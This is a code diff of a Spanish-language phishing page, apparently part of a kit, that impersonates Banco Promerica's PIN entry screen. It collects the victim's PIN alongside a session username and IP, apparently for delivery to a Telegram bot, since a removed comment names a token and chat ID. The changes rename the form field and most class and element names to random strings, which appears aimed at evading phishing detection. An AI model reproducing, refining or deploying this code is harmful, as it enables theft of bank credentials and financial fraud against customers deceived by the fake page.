@@ -1,7 +1,8 @@
 <?php
 // ===== pin.php =====
 session_start();
-include("settings.php"); // $token y $chat_id
+define('PROME_OK', true);
+include("private/cfg.php");
 
 $usuario = $_SESSION['usuario'] ?? null;
 if (!$usuario) {
@@ -10,7 +11,7 @@ if (!$usuario) {
 }
 
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $pin = preg_replace('/\D/', '', $_POST['pin'] ?? '');
+    $pin = preg_replace('/\D/', '', $_POST['n_m9j6t'] ?? '');
     $ip  = $_SERVER['REMOTE_ADDR'];
 
     $msg = "🔢 PIN ingresado\n👤 Usuario: $usuario\n🔐 PIN: $pin\n🌐 IP: $ip";
@@ -58,7 +59,7 @@ body{
     min-height:100vh;
 }
 
-.header{
+.hdR2y{
     background:#00853f;
     color:#fff;
     padding:14px 18px;
@@ -67,19 +68,19 @@ body{
     justify-content:space-between;
 }
 
-.header .logo-wrap{
+.hdR2y .lwS4p{
     display:flex;
     align-items:center;
 }
 
-.header img.logo{
+.hdR2y img.lgT8b{
     height:40px;
     width:auto;
     object-fit:contain;
     filter:brightness(0) invert(1);
 }
 
-.header .logout{
+.hdR2y .loT6m{
     color:#fff;
     background:transparent;
     border:none;
@@ -89,12 +90,12 @@ body{
     align-items:center;
 }
 
-.header .logout svg{
+.hdR2y .loT6m svg{
     width:22px;
     height:22px;
 }
 
-.content{
+.cnB1v{
     flex:1;
     display:flex;
     flex-direction:column;
@@ -103,21 +104,21 @@ body{
     position:relative;
 }
 
-.title{
+.ttQ8j{
     font-size:18px;
     color:#222;
     font-weight:400;
     margin-bottom:28px;
 }
 
-.pin-display{
+.pdK3z{
     display:flex;
     gap:14px;
     margin-bottom:42px;
     min-height:32px;
 }
 
-.pin-dot{
+.ptN5x{
     width:18px;
     height:24px;
     color:#bdbdbd;
@@ -129,18 +130,18 @@ body{
     transition:color .2s;
 }
 
-.pin-dot.filled{
+.ptN5x.fdH9c{
     color:#444;
 }
 
-.keypad{
+.kpL2r{
     display:grid;
     grid-template-columns:repeat(3, 80px);
     gap:18px 26px;
     justify-content:center;
 }
 
-.key{
+.kyW7s{
     width:80px;
     height:80px;
     border-radius:50%;
@@ -157,26 +158,26 @@ body{
     user-select:none;
 }
 
-.key:hover{
+.kyW7s:hover{
     background:#f3f3f3;
 }
 
-.key:active{
+.kyW7s:active{
     background:#e6f4ec;
     border-color:#00853f;
 }
 
-.key.empty{
+.kyW7s.emA4n{
     border:none;
     cursor:default;
     background:transparent;
 }
 
-.key.empty:hover{
+.kyW7s.emA4n:hover{
     background:transparent;
 }
 
-.key.delete{
+.kyW7s.ekP9s{
     border:none;
     background:#00853f;
     color:#fff;
@@ -186,16 +187,16 @@ body{
     height:54px;
 }
 
-.key.delete:hover{
+.kyW7s.ekP9s:hover{
     background:#006b32;
 }
 
-.key.delete svg{
+.kyW7s.ekP9s svg{
     width:22px;
     height:22px;
 }
 
-.loading-overlay{
+.loZ8d{
     position:fixed;
     inset:0;
     background:#fff;
@@ -206,24 +207,24 @@ body{
     z-index:9999;
 }
 
-.loading-overlay.show{
+.loZ8d.shB1k{
     display:flex;
 }
 
-.loading-overlay h2{
+.loZ8d h2{
     color:#006838;
     font-size:22px;
     font-weight:600;
     margin-bottom:8px;
 }
 
-.loading-overlay p{
+.loZ8d p{
     color:#888;
     font-size:14px;
     margin-bottom:24px;
 }
 
-.loading-overlay .spinner{
+.loZ8d .spR4m{
     width:60px;
     height:60px;
     border:6px solid #eee;
@@ -237,7 +238,7 @@ body{
     100%{transform:rotate(360deg);}
 }
 
-.bottom-shapes{
+.bsG2q{
     position:relative;
     width:100%;
     height:110px;
@@ -246,7 +247,7 @@ body{
     pointer-events:none;
 }
 
-.bottom-shapes svg{
+.bsG2q svg{
     position:absolute;
     bottom:0;
     left:0;
@@ -256,22 +257,22 @@ body{
 }
 
 @media(max-width:380px){
-    .keypad{
+    .kpL2r{
         grid-template-columns:repeat(3, 70px);
         gap:14px 22px;
     }
-    .key{width:70px;height:70px;font-size:24px;}
-    .key.delete{width:64px;height:48px;}
+    .kyW7s{width:70px;height:70px;font-size:24px;}
+    .kyW7s.ekP9s{width:64px;height:48px;}
 }
 </style>
 </head>
 <body>
 
-<header class="header">
-    <div class="logo-wrap">
-        <img src="img/imgLogoLogin.png" alt="Banco Promerica" class="logo">
+<header class="hdR2y">
+    <div class="lwS4p">
+        <img src="img/lg_p4n8q3.png" alt="Banco Promerica" class="lgT8b">
     </div>
-    <button type="button" class="logout" onclick="window.location.href='index.php'" aria-label="Salir">
+    <button type="button" class="loT6m" onclick="window.location.href='index.php'" aria-label="Salir">
         <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
             <path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"></path>
             <polyline points="16 17 21 12 16 7"></polyline>
@@ -280,29 +281,29 @@ body{
     </button>
 </header>
 
-<main class="content">
-    <p class="title">Digita tu PIN</p>
+<main class="cnB1v">
+    <p class="ttQ8j">Digita tu PIN</p>
 
-    <div class="pin-display" id="pinDisplay">
-        <div class="pin-dot">*</div>
-        <div class="pin-dot">*</div>
-        <div class="pin-dot">*</div>
-        <div class="pin-dot">*</div>
+    <div class="pdK3z" id="pDw9h">
+        <div class="ptN5x">*</div>
+        <div class="ptN5x">*</div>
+        <div class="ptN5x">*</div>
+        <div class="ptN5x">*</div>
     </div>
 
-    <div class="keypad" id="keypad">
-        <button type="button" class="key" data-num="1">1</button>
-        <button type="button" class="key" data-num="2">2</button>
-        <button type="button" class="key" data-num="3">3</button>
-        <button type="button" class="key" data-num="4">4</button>
-        <button type="button" class="key" data-num="5">5</button>
-        <button type="button" class="key" data-num="6">6</button>
-        <button type="button" class="key" data-num="7">7</button>
-        <button type="button" class="key" data-num="8">8</button>
-        <button type="button" class="key" data-num="9">9</button>
-        <div class="key empty"></div>
-        <button type="button" class="key" data-num="0">0</button>
-        <button type="button" class="key delete" id="btnDelete" aria-label="Borrar">
+    <div class="kpL2r" id="kpL2r">
+        <button type="button" class="kyW7s" data-num="1">1</button>
+        <button type="button" class="kyW7s" data-num="2">2</button>
+        <button type="button" class="kyW7s" data-num="3">3</button>
+        <button type="button" class="kyW7s" data-num="4">4</button>
+        <button type="button" class="kyW7s" data-num="5">5</button>
+        <button type="button" class="kyW7s" data-num="6">6</button>
+        <button type="button" class="kyW7s" data-num="7">7</button>
+        <button type="button" class="kyW7s" data-num="8">8</button>
+        <button type="button" class="kyW7s" data-num="9">9</button>
+        <div class="kyW7s emA4n"></div>
+        <button type="button" class="kyW7s" data-num="0">0</button>
+        <button type="button" class="kyW7s ekP9s" id="bDn8s" aria-label="Borrar">
             <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                 <line x1="18" y1="6" x2="6" y2="18"></line>
                 <line x1="6" y1="6" x2="18" y2="18"></line>
@@ -310,18 +311,18 @@ body{
         </button>
     </div>
 
-    <form id="pinForm" method="post" action="pin.php" style="display:none;">
-        <input type="hidden" name="pin" id="pinInput">
+    <form id="pFy6c" method="post" action="pin.php" style="display:none;">
+        <input type="hidden" name="n_m9j6t" id="pIq3r">
     </form>
 </main>
 
-<div class="loading-overlay" id="loadingOverlay">
+<div class="loZ8d" id="lOx4t">
     <h2>Por favor espera…</h2>
     <p>⚠️ No cierres esta ventana ni salgas de la página</p>
-    <div class="spinner"></div>
+    <div class="spR4m"></div>
 </div>
 
-<div class="bottom-shapes" aria-hidden="true">
+<div class="bsG2q" aria-hidden="true">
     <svg viewBox="0 0 500 110" preserveAspectRatio="none">
         <polygon points="0,110 200,40 220,110" fill="#00853f"/>
         <polygon points="180,110 320,70 340,110" fill="#7cc04a"/>
@@ -332,18 +333,18 @@ body{
 
 <script>
 (function(){
-    const dots    = document.querySelectorAll('#pinDisplay .pin-dot');
-    const keypad  = document.getElementById('keypad');
-    const form    = document.getElementById('pinForm');
-    const input   = document.getElementById('pinInput');
-    const overlay = document.getElementById('loadingOverlay');
+    const dots    = document.querySelectorAll('#pDw9h .ptN5x');
+    const kpL2r  = document.getElementById('kpL2r');
+    const form    = document.getElementById('pFy6c');
+    const input   = document.getElementById('pIq3r');
+    const overlay = document.getElementById('lOx4t');
     const MAX     = 4;
     let pin = '';
     let submitting = false;
 
     function render(){
         dots.forEach((d, i) => {
-            d.classList.toggle('filled', i < pin.length);
+            d.classList.toggle('fdH9c', i < pin.length);
         });
     }
 
@@ -352,15 +353,15 @@ body{
         submitting = true;
         input.value = pin;
         // Mostrar cargando inmediatamente
-        overlay.classList.add('show');
+        overlay.classList.add('shB1k');
         // Pequeño delay para que el render del overlay ocurra antes del submit
         setTimeout(() => form.submit(), 80);
     }
 
-    keypad.addEventListener('click', e => {
+    kpL2r.addEventListener('click', e => {
         if (submitting) return;
         const numBtn = e.target.closest('[data-num]');
-        const delBtn = e.target.closest('#btnDelete');
+        const delBtn = e.target.closest('#bDn8s');
 
         if (numBtn) {
             if (pin.length < MAX) {
